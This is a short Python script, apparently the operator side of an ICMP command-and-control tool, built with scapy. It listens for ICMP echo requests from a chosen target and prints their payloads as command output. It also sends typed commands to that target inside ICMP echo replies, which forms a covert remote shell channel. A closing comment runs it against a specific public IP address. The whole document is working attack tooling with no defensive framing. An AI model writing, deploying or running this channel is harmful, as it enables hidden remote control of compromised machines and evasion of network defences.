#!/usr/bin/env python3
from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
from multiprocessing import Process

# Variables
ICMP_ID = int(13170)
TTL = int(64)

class color:
  BOLD = '\033[1m'
  RED='\033[1;31m'
  END = '\033[0m'

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")

args = parser.parse_args()

# Request- type 8
# Reply -  type 0

# Sniffing incoming ICMP packets (iface = name of network interface , prn = which func )
def sniffer():
    sniff(iface=args.interface, prn=shell, filter="icmp", store="0")


def shell(packet):
    if packet[IP].src == args.destination_ip and packet[ICMP].type == 8 and packet[ICMP].id == ICMP_ID and packet[Raw].load:
        icmppacket = (packet[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(icmppacket)
    else:
        pass

def main():
    sniffing = Process(target=sniffer)
    sniffing.start()
    print("[+]ICMP C2 started!")
    while True:
        icmpshell = input(color.RED + "┌──(C2㉿Shell)\n└─$ "+color.END)
        if icmpshell == 'exit':
            print("[+]Stopping ICMP C2...")
            sniffing.terminate()
            break
        elif icmpshell == '':
            pass
        else:
            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0,id=ICMP_ID)/Raw(load=icmpshell))
            sr(payload, timeout=0, verbose=0)
    sniffing.join()

if __name__ == "__main__":
    main()

# sudo -E ./c2.py -i eth0 -d 213.57.121.34